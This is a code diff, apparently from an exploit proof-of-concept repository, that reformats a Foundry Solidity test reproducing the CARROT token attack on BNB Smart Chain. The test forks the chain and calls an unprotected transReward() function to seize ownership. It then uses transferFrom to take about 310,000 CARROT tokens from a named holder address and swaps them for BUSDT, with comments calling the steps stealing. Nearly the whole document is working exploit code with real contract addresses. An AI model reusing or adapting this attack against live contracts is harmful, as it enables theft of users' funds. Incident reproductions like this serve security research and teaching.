@@ -87,16 +87,16 @@ Explanation by: Kayaba-Attribution
 */
 
 interface ICarrot is IERC20 {
+
     function transReward(bytes memory data) external;
+
 }
 
 contract ContractTest is Test {
-    IUniswapV2Router constant PS_ROUTER =
-        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
-    ICarrot constant CARROT_TOKEN =
-        ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);
-    IERC20 constant BUSDT_TOKEN =
-        IERC20(0x55d398326f99059fF775485246999027B3197955); // Binance USDT
+
+    IUniswapV2Router constant PS_ROUTER = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    ICarrot constant CARROT_TOKEN = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);
+    IERC20 constant BUSDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955); // Binance USDT
 
     function setUp() public {
         vm.createSelectFork("bsc", 22_055_611);
@@ -104,42 +104,31 @@ contract ContractTest is Test {
         vm.label(address(PS_ROUTER), "PS_ROUTER");
         vm.label(address(CARROT_TOKEN), "CARROT_TOKEN");
         vm.label(address(BUSDT_TOKEN), "BUSDT_TOKEN");
-        vm.label(
-            address(0xF34c9a6AaAc94022f96D4589B73d498491f817FA),
-            "CARROT_BUSDT_PAIR"
-        );
+        vm.label(address(0xF34c9a6AaAc94022f96D4589B73d498491f817FA), "CARROT_BUSDT_PAIR");
         vm.label(address(0x6863b549bf730863157318df4496eD111aDFA64f), "Pool");
     }
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "[Start] Attacker BUSDT balance before exploit",
-            BUSDT_TOKEN.balanceOf(address(this)),
-            18
+            "[Start] Attacker BUSDT balance before exploit", BUSDT_TOKEN.balanceOf(address(this)), 18
         );
 
         // Call vulnerable transReward() to set this contract as owner. No auth control
-        CARROT_TOKEN.transReward(
-            abi.encodeWithSelector(0xbf699b4b, address(this))
-        );
+        CARROT_TOKEN.transReward(abi.encodeWithSelector(0xbf699b4b, address(this)));
 
         // Empty transferFrom() called during the exploit. Apparently not needed.
         // CARROT_TOKEN.transferFrom(address(this), address(CARROT_TOKEN), 0);
 
         // Call transferFrom() to steal CARROT tokens using the same amount used in the exploit
         CARROT_TOKEN.transferFrom(
-            0x00B433800970286CF08F34C96cf07f35412F1161,
-            address(this),
-            310_344_736_073_087_429_864_760
+            0x00B433800970286CF08F34C96cf07f35412F1161, address(this), 310_344_736_073_087_429_864_760
         );
 
         // Swap all stolen Carrot to BUSDT
         _CARROTToBUSDT();
 
         emit log_named_decimal_uint(
-            "[End] Attacker BUSDT balance after exploit",
-            BUSDT_TOKEN.balanceOf(address(this)),
-            18
+            "[End] Attacker BUSDT balance after exploit", BUSDT_TOKEN.balanceOf(address(this)), 18
         );
     }
 
@@ -157,11 +146,8 @@ contract ContractTest is Test {
         path[0] = address(CARROT_TOKEN);
         path[1] = address(BUSDT_TOKEN);
         PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            CARROT_TOKEN.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            CARROT_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
+
 }
